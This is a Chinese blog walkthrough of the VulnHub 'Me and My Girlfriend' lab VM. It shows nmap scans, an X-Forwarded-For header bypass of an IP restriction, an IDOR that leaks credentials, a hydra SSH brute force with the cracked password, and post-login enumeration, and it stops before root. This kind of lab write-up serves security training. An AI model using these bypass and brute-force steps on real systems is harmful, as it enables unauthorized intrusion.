---
layout: post
toc: true
title: "「渗透」：vulnhub-me-and-myGirlfriend"
date: 2020-01-08
author: Bin4xin
categories:
  - blog
  - 漏洞复现
  - 渗透
  - vulnhub
permalink: /blog/2020/vulnhub-me-and-myGirlfriend/
---

* vulnhub走一波～

# 嗅探靶机

## nmap开路
查看一下靶机ip是多少
```javascript
root@bin4xin:/usr/share/wordlist# nmap -sP 192.168.3.0/24

Starting Nmap 7.60 ( https://nmap.org ) at 2020-01-08 10:06 UTC
Nmap scan report for _gateway (192.168.3.1)
Host is up (0.0018s latency).
MAC Address: 24:DA:33:2A:53:84 (Unknown)
Nmap scan report for 192.168.3.3
Host is up (0.0023s latency).
MAC Address: 6C:4B:90:33:8A:CC (LiteON)
Nmap scan report for 192.168.3.11
Host is up (0.010s latency).
MAC Address: 1A:DF:41:4B:9D:05 (Unknown)
Nmap scan report for 192.168.3.14
Host is up (0.049s latency).
MAC Address: F4:63:1F:BF:96:DB (Unknown)
Nmap scan report for 192.168.3.17
Host is up (0.010s latency).
MAC Address: 2C:6F:C9:12:7B:42 (Hon Hai Precision Ind.)
Nmap scan report for 192.168.3.30
Host is up (0.010s latency).
MAC Address: 88:B1:11:7D:83:45 (Intel Corporate)
Nmap scan report for 192.168.3.32
Host is up (-0.10s latency).
MAC Address: 68:07:15:D5:46:16 (Intel Corporate)
Nmap scan report for 192.168.3.33
Host is up (-0.094s latency).
MAC Address: 94:87:E0:1B:F2:D5 (Unknown)
Nmap scan report for 192.168.3.34
Host is up (0.010s latency).
MAC Address: F4:60:E2:8B:C8:BC (Unknown)
Nmap scan report for 192.168.3.40
Host is up (0.046s latency).
MAC Address: 24:DF:6A:25:C6:8E (Huawei Technologies)
Nmap scan report for 192.168.3.59
Host is up (0.00033s latency).
MAC Address: 08:00:27:FD:9B:9B (Oracle VirtualBox virtual NIC)
Nmap scan report for bin4xin (192.168.3.60)
Host is up.
Nmap done: 256 IP addresses (12 hosts up) scanned in 5.35 seconds
```
看到oracle virtual box后缀结尾的，靶机ip为`192.168.3.59`
扫描一波端口先：
```javascript
root@bin4xin:/usr/share/wordlist# nmap -A -O 192.168.3.59

Starting Nmap 7.60 ( https://nmap.org ) at 2020-01-08 10:08 UTC
Nmap scan report for 192.168.3.59
Host is up (0.00022s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 57:e1:56:58:46:04:33:56:3d:c3:4b:a7:93:ee:23:16 (DSA)
|   2048 3b:26:4d:e4:a0:3b:f8:75:d9:6e:15:55:82:8c:71:97 (RSA)
|   256 8f:48:97:9b:55:11:5b:f1:6c:1d:b3:4a:bc:36:bd:b0 (ECDSA)
|_  256 d0:c3:02:a1:c4:c2:a8:ac:3b:84:ae:8f:e5:79:66:76 (EdDSA)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:FD:9B:9B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.22 ms 192.168.3.59

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.64 seconds
```
中间`web`部分是一个ip限制的考点，在request头部加上`x-forwarded-for:localhost`就可以绕过了，之后进去是一个登录页面，大致内容是参数暴露信息的漏洞：
抓用户信息包，如下
## localhost限制
```javascript
GET /?page=index HTTP/1.1
Host: 192.168.3.59
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
x-forwarded-for:localhost
Connection: close
Upgrade-Insecure-Requests: 1
```
回显，加上本地头ip后回显正常本地根目录登录页面：
```javascript
HTTP/1.1 200 OK
Date: Wed, 08 Jan 2020 09:36:34 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.29
Set-Cookie: PHPSESSID=72l97ppkrc8kgffl3n72dv37f3; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 676
Connection: close
Content-Type: text/html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Ceban Corp</title>
    <style>
        .center {
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="center">
        <h2>Welcome To Ceban Corp</h2>
        <p>Inspiring The People To Great Again!</p>
        <hr>
                <p><a href="?page=index">Home</a> | <a href="?page=login">Login</a> | 
                <a href="?page=register">Register</a> | <a href="?page=about">About</a></p>
                <hr>
    </div>

    
</body>
</html>

```

---

# 利用漏洞
绕过ip限制后，主页`注册`-`登录`-`修改user_id参数`，burpsuite参数截图如下：
![](/assets/img/post-pic/post-gf-bp.png)

# 连接靶机

hydra爆破ssh
根据web爆出的用户名密码新建user、pass文件，尝试使用海德拉爆破ssh服务：
```javascript
root@bin4xin:/home/bin4xin# cd /usr/share/wordlist/
root@bin4xin:/usr/share/wordlist# ls
root@bin4xin:/usr/share/wordlist#
root@bin4xin:/usr/share/wordlist# vi user
root@bin4xin:/usr/share/wordlist# root@bin4xin:/usr/share/wordlist#
root@bin4xin:/usr/share/wordlist# ls
user
root@bin4xin:/usr/share/wordlist# vi pass
root@bin4xin:/usr/share/wordlist# root@bin4xin:/usr/share/wordlist# vi user
root@bin4xin:/usr/share/wordlist# root@bin4xin:/usr/share/wordlist#
root@bin4xin:/usr/share/wordlist#
root@bin4xin:/usr/share/wordlist#
```
输入`hydra -h`查看一下ssh爆破命令：
```javascript
root@bin4xin:/usr/share/wordlist# hydra -h
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or 
for illegal purposes.

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] 
[-t TASKS] [-M FILE [-T TASKS]] [-w TIME] 
[-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]

Options:
  -R        restore a previous aborted/crashed session
  -I        ignore an existing restore file (don't wait 10 seconds)
  -S        perform an SSL connect
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help
  -y        disable use of symbols in bruteforce, see above
  -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login
  -u        loop around users, not passwords (effective! implied with -x)
  -C FILE   colon separated "login:pass" format, instead of -L/-P options
  -M FILE   list of servers to attack, one entry per line, ':' to specify port
  -o FILE   write found login/password pairs to FILE instead of stdout
  -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1
  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
  -t TASKS  run TASKS number of connects in parallel per target (default: 16)
  -T TASKS  run TASKS connects in parallel overall (for -M, default: 64)
  -w / -W TIME  wait time for a response (32) / between connects per thread (0)
  -c TIME   wait time per login attempt over all threads (enforces -t 1)
  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)
  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode
  -O        use old SSL v2 and v3
  -q        do not print messages about connection errors
  -U        service module usage details
  -h        more command line options (COMPLETE HELP)
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)
  OPT       some service modules support additional input (-U for module help)

Supported services: 
adam6500 asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get|post} http[s]-{get|post}
-form http-proxy http-proxy-urlenum 
icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5]
[s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2
rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp
[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp

Hydra is a tool to guess/crack valid login/password pairs. Licensed under AGPL
v3.0. The newest version is always available at http://www.thc.org/thc-hydra
Don't use in military or secret service organizations, or for illegal purposes.
These services were not compiled in: afp ncp oracle sapr3.

Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
     % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)
     % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
     % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)

Examples:
  hydra -l user -P passlist.txt ftp://192.168.0.1
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L logins.txt -P pws.txt -M targets.txt ssh
```
根据上面的爆破命令，编写爆破命令，代码过程如下：
```javascript
root@bin4xin:/usr/share/wordlist# hydra -L user -P pass ssh://192.168.3.59
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2020-01-08 09:56:30
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 36 login tries (l:6/p:6), ~3 tries per task
[DATA] attacking ssh://192.168.3.59:22/
[22][ssh] host: 192.168.3.59   login: alice   password: 4lic3
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 16 targets did not complete
Hydra (http://www.thc.org/thc-hydra) finished at 2020-01-08 09:56:35
root@bin4xin:/usr/share/wordlist#            
```
如上爆破出ssh服务密码:`[22][ssh] host: 192.168.3.59   login: alice   password: 4lic3`
<br>直接ssh连接：
```javascript
C:\Users\本阿信>ssh 192.168.3.59 -l alice
Could not create directory 'C:\\Users\\\346\234\254\351\230\277\344\277\241/.ssh'.
The authenticity of host '192.168.3.59 (192.168.3.59)' can't be established.
ECDSA key fingerprint is SHA256:lE5D8AvkJqcIwHiNuI9aSnC3ohlDrhPhjDljqSDy9sY.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (C:\\Users\\\346\234\254\351\230\277\344\277\241/.ssh/known_hosts).
alice@192.168.3.59's password:
Last login: Fri Dec 13 14:48:25 2019
alice@gfriEND:~$ id
uid=1000(alice) gid=1001(alice) groups=1001(alice)
```

# 尝试提权

靶机还没搞完，ssh连上就按套路查看了一下当前user可写的文件，查看到一些有趣的东西，但由于最近好多事，还没有搞到机器root，待更新。

```javascript
alice@gfriEND:~$
alice@gfriEND:~$ find / -writable -type d 2>/dev/null
/home/alice
/home/alice/.cache
/home/alice/.my_secret
/run/user/1000
/run/shm
/run/lock
/tmp
/var/lib/php5
/var/crash
/var/tmp
/proc/1591/task/1591/fd
/proc/1591/fd
/proc/1591/map_files
/sys/fs/cgroup/systemd/user/1000.user/2.session
alice@gfriEND:~$ cd /home/alice/
alice@gfriEND:~$ cat .my_secret/
cat: .my_secret/: Is a directory
alice@gfriEND:~$ cd .my_secret/
alice@gfriEND:~/.my_secret$ ls
flag1.txt  my_notes.txt
alice@gfriEND:~/.my_secret$ ls -la
total 16
drwxrwxr-x 2 alice alice 4096 Dec 13 14:10 .
drwxr-xr-x 4 alice alice 4096 Dec 13 14:47 ..
-rw-r--r-- 1 root  root   306 Dec 13 13:04 flag1.txt
-rw-rw-r-- 1 alice alice  119 Dec 13 12:23 my_notes.txt
alice@gfriEND:~/.my_secret$ cat flag1.txt
Greattttt my brother! You saw the Alice's note! Now you save the record information to give to bob! 
I know if it's given to him then Bob will be hurt but this is better than Bob cheated!

Now your last job is get access to the root and read the flag ^_^

Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}

alice@gfriEND:~/.my_secret$ cat my_notes.txt
Woahhh! I like this company, I hope that here i get a better partner than bob ^_^, 
hopefully Bob doesn't know my notes
```
各种姿势尝试：
```javascript
alice@gfriEND:~/.my_secret$ cd ..
alice@gfriEND:~$ l
alice@gfriEND:~$ ls
alice@gfriEND:~$ cd ..
alice@gfriEND:/home$ ls
aingmaung  alice  eweuhtandingan  sundatea
alice@gfriEND:/home$ ls -la
total 24
drwxr-xr-x  6 root           root           4096 Dec 13 12:18 .
drwxr-xr-x 22 root           root           4096 Dec 13 10:21 ..
drwxr-xr-x  2 aingmaung      aingmaung      4096 Dec 13 12:18 aingmaung
drwxr-xr-x  4 alice          alice          4096 Dec 13 14:47 alice
drwxr-xr-x  2 eweuhtandingan eweuhtandingan 4096 Dec 13 12:18 eweuhtandingan
drwxr-xr-x  2 sundatea       sundatea       4096 Dec 13 12:18 sundatea
alice@gfriEND:/home$ cd /proc/1591/map_files
-bash: cd: /proc/1591/map_files: No such file or directory
alice@gfriEND:/home$ ls
aingmaung  alice  eweuhtandingan  sundatea
alice@gfriEND:/home$ cd /proc/1592/
alice@gfriEND:/proc/1592$ ls
ls: cannot read symbolic link cwd: Permission denied
ls: cannot read symbolic link root: Permission denied
ls: cannot read symbolic link exe: Permission denied
attr        comm             fd        map_files   net            pagemap      sessionid  status
autogroup   coredump_filter  fdinfo    maps        ns             personality  setgroups  syscall
auxv        cpuset           gid_map   mem         numa_maps      projid_map   smaps      task
cgroup      cwd              io        mountinfo   oom_adj        root         stack      timers
clear_refs  environ          limits    mounts      oom_score      sched        stat       uid_map
cmdline     exe              loginuid  mountstats  oom_score_adj  schedstat    statm      wchan
alice@gfriEND:/proc/1592$ cat map_files/
cat: map_files/: Permission denied
alice@gfriEND:/proc/1592$ ls -la
ls: cannot read symbolic link cwd: Permission denied
ls: cannot read symbolic link root: Permission denied
ls: cannot read symbolic link exe: Permission denied
total 0
dr-xr-xr-x   9 root root 0 Jan  8 17:01 .
dr-xr-xr-x 102 root root 0 Jan  8 16:29 ..
dr-xr-xr-x   2 root root 0 Jan  8 17:01 attr
-rw-r--r--   1 root root 0 Jan  8 17:01 autogroup
-r--------   1 root root 0 Jan  8 17:01 auxv
-r--r--r--   1 root root 0 Jan  8 17:01 cgroup
--w-------   1 root root 0 Jan  8 17:01 clear_refs
-r--r--r--   1 root root 0 Jan  8 17:01 cmdline
-rw-r--r--   1 root root 0 Jan  8 17:01 comm
-rw-r--r--   1 root root 0 Jan  8 17:01 coredump_filter
-r--r--r--   1 root root 0 Jan  8 17:01 cpuset
lrwxrwxrwx   1 root root 0 Jan  8 17:01 cwd
-r--------   1 root root 0 Jan  8 17:01 environ
lrwxrwxrwx   1 root root 0 Jan  8 17:01 exe
dr-x------   2 root root 0 Jan  8 17:01 fd
dr-x------   2 root root 0 Jan  8 17:01 fdinfo
-rw-r--r--   1 root root 0 Jan  8 17:01 gid_map
-r--------   1 root root 0 Jan  8 17:01 io
-r--r--r--   1 root root 0 Jan  8 17:01 limits
-rw-r--r--   1 root root 0 Jan  8 17:01 loginuid
dr-x------   2 root root 0 Jan  8 17:01 map_files
-r--r--r--   1 root root 0 Jan  8 17:01 maps
-rw-------   1 root root 0 Jan  8 17:01 mem
-r--r--r--   1 root root 0 Jan  8 17:01 mountinfo
-r--r--r--   1 root root 0 Jan  8 17:01 mounts
-r--------   1 root root 0 Jan  8 17:01 mountstats
dr-xr-xr-x   5 root root 0 Jan  8 17:01 net
dr-x--x--x   2 root root 0 Jan  8 17:01 ns
-r--r--r--   1 root root 0 Jan  8 17:01 numa_maps
-rw-r--r--   1 root root 0 Jan  8 17:01 oom_adj
-r--r--r--   1 root root 0 Jan  8 17:01 oom_score
-rw-r--r--   1 root root 0 Jan  8 17:01 oom_score_adj
-r--------   1 root root 0 Jan  8 17:01 pagemap
-r--------   1 root root 0 Jan  8 17:01 personality
-rw-r--r--   1 root root 0 Jan  8 17:01 projid_map
lrwxrwxrwx   1 root root 0 Jan  8 17:01 root
-rw-r--r--   1 root root 0 Jan  8 17:01 sched
-r--r--r--   1 root root 0 Jan  8 17:01 schedstat
-r--r--r--   1 root root 0 Jan  8 17:01 sessionid
-rw-r--r--   1 root root 0 Jan  8 17:01 setgroups
-r--r--r--   1 root root 0 Jan  8 17:01 smaps
-r--------   1 root root 0 Jan  8 17:01 stack
-r--r--r--   1 root root 0 Jan  8 17:01 stat
-r--r--r--   1 root root 0 Jan  8 17:01 statm
-r--r--r--   1 root root 0 Jan  8 17:01 status
```

